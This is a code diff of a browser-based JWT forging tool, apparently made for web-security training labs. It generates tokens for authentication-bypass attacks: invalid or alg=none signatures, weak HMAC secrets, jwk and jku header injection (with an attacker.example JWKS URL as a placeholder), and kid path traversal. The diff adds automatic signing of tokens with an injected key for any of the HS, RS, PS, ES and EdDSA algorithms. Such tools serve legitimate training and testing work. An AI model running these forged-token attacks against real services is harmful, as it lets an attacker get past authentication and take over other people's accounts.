@@ -9,30 +9,22 @@ const extraInputLabel = document.getElementById('extraInputLabel');
 const extraInput = document.getElementById('extraInput');
 const extraInputHelp = document.getElementById('extraInputHelp');
 const jwkTools = document.getElementById('jwkTools');
-const genRsa2048Btn = document.getElementById('genRsa2048Btn');
-const genRsa4096Btn = document.getElementById('genRsa4096Btn');
-const signAlg = document.getElementById('signAlg');
-const signKeyInput = document.getElementById('signKeyInput');
-const genKeyBtn = document.getElementById('genKeyBtn');
-const signCurrentBtn = document.getElementById('signCurrentBtn');
-const signerHelp = document.getElementById('signerHelp');
+const jwkAlgSelect = document.getElementById('jwkAlgSelect');
+const genJwkAlgKeyBtn = document.getElementById('genJwkAlgKeyBtn');
+const jwkAlgHelp = document.getElementById('jwkAlgHelp');
 const generateBtn = document.getElementById('generateBtn');
 const resultToken = document.getElementById('resultToken');
 const attackNotes = document.getElementById('attackNotes');
 const copyBtn = document.getElementById('copyBtn');
 
 let selectedAttack = 'unverified-signature';
-let generatedJwkPair = null;
-let generatedSignerJwk = null;
+let generatedJwkMaterial = null;
 
 sourceToken.value = localStorage.getItem('jwt.source') || '';
 if (sourceToken.value) decodeJwt();
 
 reloadBtn.addEventListener('click', decodeJwt);
-genRsa2048Btn.addEventListener('click', async () => generateRsaForJwk(2048));
-genRsa4096Btn.addEventListener('click', async () => generateRsaForJwk(4096));
-genKeyBtn.addEventListener('click', generateSignerKeyForSelectedAlg);
-signCurrentBtn.addEventListener('click', signCurrentWithSelectedAlg);
+genJwkAlgKeyBtn.addEventListener('click', generateKeyForJwkAttack);
 
 for (const btn of document.querySelectorAll('[data-attack]')) {
   btn.addEventListener('click', () => {
@@ -57,10 +49,7 @@ generateBtn.addEventListener('click', async () => {
     let notes = [];
 
     if (selectedAttack === 'unverified-signature') {
-      notes = [
-        'Lab: JWT authentication bypass via unverified signature.',
-        'Payload is modified but signature is intentionally invalid.',
-      ];
+      notes = ['Lab: JWT authentication bypass via unverified signature.'];
     }
 
     if (selectedAttack === 'flawed-signature') {
@@ -80,16 +69,22 @@ generateBtn.addEventListener('click', async () => {
     }
 
     if (selectedAttack === 'jwk-header-injection') {
-      nextHeader.alg = 'RS256';
+      const alg = jwkAlgSelect.value;
+      nextHeader.alg = alg;
       const publicJwk = readJsonInput('{"kty":"RSA","e":"AQAB","n":"..."}', 'Provide public JWK JSON.');
       nextHeader.jwk = publicJwk;
+
       const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
-      if (generatedJwkPair?.privateJwk && isSamePublicJwk(generatedJwkPair.publicJwk, publicJwk)) {
-        nextSig = await rsaPkcs1SignBase64url(signingInput, generatedJwkPair.privateJwk, 'SHA-256');
+      if (generatedJwkMaterial && generatedJwkMaterial.alg === alg && isSameJwk(generatedJwkMaterial.publicJwk, publicJwk)) {
+        nextSig = await signWithMaterial(signingInput, alg, generatedJwkMaterial);
       } else {
-        nextSig = '<provide-privateJwk-to-sign>';
+        nextSig = '<generate-key-or-sign-manually>';
       }
-      notes = ['Lab: JWT authentication bypass via jwk header injection.'];
+
+      notes = [
+        `Lab: JWT authentication bypass via jwk header injection (${alg}).`,
+        'Generate key in this section to auto-sign, or sign manually if using external key.',
+      ];
     }
 
     if (selectedAttack === 'jku-header-injection') {
@@ -127,11 +122,13 @@ function configureInputForAttack(key) {
   jwkTools.classList.add('hidden');
 
   if (key === 'weak-signing-key') return showInput('Weak key / secret', 'secret1', 'Required for HS attack.');
+
   if (key === 'jwk-header-injection') {
-    showInput('Public JWK JSON', '{"kty":"RSA","e":"AQAB","n":"..."}', 'Required JWK to inject into header.');
+    showInput('Public JWK JSON', '{"kty":"RSA","e":"AQAB","n":"..."}', 'Required JWK to inject. Generate key by selected alg below.');
     jwkTools.classList.remove('hidden');
     return;
   }
+
   if (key === 'jku-header-injection') return showInput('JKU URL', 'https://attacker.example/jwks.json', 'Required attacker-controlled JWKS URL.');
   if (key === 'kid-path-traversal') return showInput('Signing key', '', 'Required signing key ("" for empty).');
 
@@ -162,80 +159,37 @@ function getPresetHint(key) {
     'unverified-signature': 'Generates token with invalid signature.',
     'flawed-signature': 'Generates alg=none token with empty signature.',
     'weak-signing-key': 'Requires user-provided secret.',
-    'jwk-header-injection': 'Requires injected public JWK.',
+    'jwk-header-injection': 'Choose algorithm, generate key, then generate token.',
     'jku-header-injection': 'Requires jku URL.',
     'kid-path-traversal': 'Requires signing key.',
   };
   return hints[key] || 'Choose preset and generate.';
 }
 
-async function generateRsaForJwk(modulusLength) {
+async function generateKeyForJwkAttack() {
   try {
-    const pair = await crypto.subtle.generateKey(
-      { name: 'RSASSA-PKCS1-v1_5', modulusLength, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256' },
-      true,
-      ['sign', 'verify'],
-    );
-    const publicJwk = await crypto.subtle.exportKey('jwk', pair.publicKey);
-    const privateJwk = await crypto.subtle.exportKey('jwk', pair.privateKey);
-    generatedJwkPair = { publicJwk, privateJwk };
-    extraInput.value = JSON.stringify(publicJwk);
-    attackNotes.textContent = `Generated RSA-${modulusLength} key pair for JWK injection.`;
-  } catch (err) {
-    decodeError.textContent = `Key generation error: ${err.message}`;
-  }
-}
+    const alg = jwkAlgSelect.value;
+    let publicJwk;
 
-async function generateSignerKeyForSelectedAlg() {
-  try {
-    const alg = signAlg.value;
     if (alg.startsWith('HS')) {
-      signerHelp.textContent = 'For HS algorithms use your own secret in the key material field.';
+      const secret = randomSecret(32);
+      publicJwk = { kty: 'oct', k: utf8ToBase64url(secret), alg };
+      generatedJwkMaterial = { alg, secret, publicJwk };
+      extraInput.value = JSON.stringify(publicJwk);
+      jwkAlgHelp.textContent = `Generated symmetric key for ${alg}.`; 
       return;
     }
 
     const pair = await generateKeyPairForAlg(alg);
-    const publicJwk = await crypto.subtle.exportKey('jwk', pair.publicKey);
+    publicJwk = await crypto.subtle.exportKey('jwk', pair.publicKey);
     const privateJwk = await crypto.subtle.exportKey('jwk', pair.privateKey);
-    generatedSignerJwk = { publicJwk, privateJwk, alg };
-    signKeyInput.value = JSON.stringify(privateJwk);
-    signerHelp.textContent = `Generated key pair for ${alg}. Private JWK inserted.`;
+
+    generatedJwkMaterial = { alg, publicJwk, privateJwk };
+    extraInput.value = JSON.stringify(publicJwk);
+    jwkAlgHelp.textContent = `Generated key pair for ${alg} and inserted public JWK.`;
   } catch (err) {
-    decodeError.textContent = `Signer key generation error: ${err.message}`;
+    decodeError.textContent = `JWK key generation error: ${err.message}`;
   }
-}
-
-async function signCurrentWithSelectedAlg() {
-  try {
-    const [headerB64] = mustParseToken(sourceToken.value.trim());
-    const header = parsePart(headerB64);
-    const payload = JSON.parse(payloadEditor.value);
-    const alg = signAlg.value;
-    header.alg = alg;
-
-    const signingInput = `${base64urlJson(header)}.${base64urlJson(payload)}`;
-    let signature = '';
-
-    if (alg.startsWith('HS')) {
-      const secret = signKeyInput.value;
-      if (!secret) throw new Error('Provide secret for HS signing.');
-      signature = await hmacSignBase64url(signingInput, secret, hashFromAlg(alg));
-    } else {
-      const privateJwk = JSON.parse(signKeyInput.value);
-      signature = await asymmetricSignBase64url(signingInput, alg, privateJwk);
-    }
-
-    resultToken.value = `${signingInput}.${signature}`;
-    attackNotes.textContent = `Signed with ${alg}.`;
-  } catch (err) {
-    decodeError.textContent = `Signer error: ${err.message}`;
-  }
-}
-
-function mustParseToken(token) {
-  const parts = token.split('.');
-  if (parts.length !== 3) throw new Error('JWT must have 3 parts.');
-  return parts;
 }
 
 async function generateKeyPairForAlg(alg) {
@@ -262,12 +216,19 @@ async function generateKeyPairForAlg(alg) {
   throw new Error(`Unsupported algorithm: ${alg}`);
 }
 
-async function asymmetricSignBase64url(message, alg, privateJwk) {
-  if (alg.startsWith('RS')) return rsaPkcs1SignBase64url(message, privateJwk, hashFromAlg(alg));
-  if (alg.startsWith('PS')) return rsaPssSignBase64url(message, privateJwk, hashFromAlg(alg), saltLenFromHash(hashFromAlg(alg)));
-  if (alg.startsWith('ES')) return ecdsaSignBase64url(message, privateJwk, hashFromAlg(alg));
-  if (alg === 'EdDSA') return eddsaSignBase64url(message, privateJwk);
-  throw new Error(`Unsupported algorithm for signing: ${alg}`);
+async function signWithMaterial(signingInput, alg, material) {
+  if (alg.startsWith('HS')) return hmacSignBase64url(signingInput, material.secret, hashFromAlg(alg));
+  if (alg.startsWith('RS')) return rsaPkcs1SignBase64url(signingInput, material.privateJwk, hashFromAlg(alg));
+  if (alg.startsWith('PS')) return rsaPssSignBase64url(signingInput, material.privateJwk, hashFromAlg(alg), saltLenFromHash(hashFromAlg(alg)));
+  if (alg.startsWith('ES')) return ecdsaSignBase64url(signingInput, material.privateJwk, hashFromAlg(alg));
+  if (alg === 'EdDSA') return eddsaSignBase64url(signingInput, material.privateJwk);
+  throw new Error(`Unsupported sign algorithm: ${alg}`);
+}
+
+function mustParseToken(token) {
+  const parts = token.split('.');
+  if (parts.length !== 3) throw new Error('JWT must have 3 parts.');
+  return parts;
 }
 
 function hashFromAlg(alg) {
@@ -291,8 +252,12 @@ function saltLenFromHash(hash) {
   return 64;
 }
 
-function isSamePublicJwk(a, b) {
-  return !!a && !!b && a.kty === b.kty && a.n === b.n && a.e === b.e;
+function isSameJwk(a, b) {
+  if (!a || !b || a.kty !== b.kty) return false;
+  if (a.kty === 'oct') return a.k === b.k;
+  if (a.kty === 'RSA') return a.n === b.n && a.e === b.e;
+  if (a.kty === 'EC' || a.kty === 'OKP') return a.x === b.x && a.y === b.y && a.crv === b.crv;
+  return false;
 }
 
 function decodeJwt() {
@@ -326,6 +291,21 @@ function base64urlToBase64(input) {
 
 function base64ToBase64url(input) {
   return input.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
+}
+
+function utf8ToBase64url(text) {
+  const bytes = new TextEncoder().encode(text);
+  let binary = '';
+  for (const b of bytes) binary += String.fromCharCode(b);
+  return base64ToBase64url(btoa(binary));
+}
+
+function randomSecret(length) {
+  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let out = '';
+  const rnd = crypto.getRandomValues(new Uint8Array(length));
+  for (const v of rnd) out += chars[v % chars.length];
+  return out;
 }
 
 async function hmacSignBase64url(message, secret, hash) {
